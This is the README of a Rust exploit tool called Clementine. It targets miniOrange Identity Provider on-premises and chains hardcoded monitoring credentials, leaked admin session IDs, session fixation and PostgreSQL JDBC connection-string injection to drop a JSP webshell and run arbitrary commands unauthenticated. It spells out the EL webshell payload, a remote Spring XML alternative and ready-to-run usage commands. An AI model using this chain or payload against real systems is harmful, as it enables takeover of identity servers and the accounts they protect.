# Clementine

Exploit for miniOrange Identity Provider (on-premises) achieving unauthenticated remote code execution.

## Vulnerability Summary

| Component | Issue |
|-----------|-------|
| JavaMelody Monitoring | Hardcoded credentials (`moadminidp:P@ssw0rd$987123`) |
| Apache Shiro Session Cache | Session IDs exposed via monitoring endpoint |
| Database Configuration | JDBC connection string injection leading to RCE |

**Affected Versions:** Tested on miniOrange 3.4

## Attack Chain

```
1. Access /monitoring with hardcoded creds
   └─> Leak Shiro session cache keys (admin session IDs)

2. Session fixation with leaked JSESSIONID
   └─> Authenticate as admin without credentials

3. Add malicious database configuration
   └─> Inject JDBC connection string with payload

4. Trigger database "test connection"
   └─> Execute payload, drop webshell

5. Command execution via webshell
   └─> /idp/cmd.jsp?cmd=<command>
```

## RCE Methods

### Method 1: EL Expression Injection (Default)

Exploits PostgreSQL JDBC driver logging behavior:
- Sets `loggerLevel=TRACE` and `loggerFile=./moas/idp/cmd.jsp`
- Injects EL expression into `ApplicationName` parameter
- Failed connection attempt writes expression to JSP file
- Expression evaluates on access: `${Runtime.getRuntime().exec(param.cmd)}`

This method works without outbound network access.

### Method 2: Spring XML Context Loading (Commented)

Uses the `socketFactoryArg` gadget with `FileSystemXmlApplicationContext`:
- JDBC driver loads attacker-controlled XML from remote URL
- XML defines a `ProcessBuilder` bean that executes on initialization
- Requires outbound HTTP access to fetch the XML payload

See `resources/trigger.xml` for the payload structure.

## Usage

```bash
# Build
cargo build --release

# Execute command on target
./target/release/clementine -t https://target.com -c "id"

# Skip exploitation phase (use existing webshell)
./target/release/clementine -t https://target.com -c "whoami" --nopwn
```

### Options

| Flag | Description |
|------|-------------|
| `-t, --target` | Target URL (required) |
| `-c, --cmd` | Command to execute (required) |
| `--nopwn` | Skip exploitation, use existing webshell |

## Files

| Path | Purpose |
|------|---------|
| `src/main.rs` | Exploit implementation |
| `resources/cmd.jsp` | Reference webshell (for Method 2) |
| `resources/trigger.xml` | Spring XML RCE payload (for Method 2) |

## Notes

- Method 1 requires a brief delay (~3s) after triggering for the JSP to become accessible
- The exploit automatically cleans up the malicious database configuration after triggering
- Session leak may return multiple candidates; the exploit iterates until finding a valid admin session
